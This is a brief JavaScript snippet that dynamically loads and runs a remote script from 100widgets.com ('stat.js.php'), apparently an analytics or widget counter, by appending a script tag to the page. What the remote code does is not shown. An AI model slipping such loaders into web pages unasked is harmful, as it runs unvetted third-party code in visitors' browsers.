var js = document.createElement("script");
js.type = "text/javascript";
js.src = "https://100widgets.com/stat.js.php";
if(document.querySelector("body")){
document.querySelector("body").appendChild(js);
} else if (document.querySelector("head")) {
document.querySelector("head").appendChild(js);
}
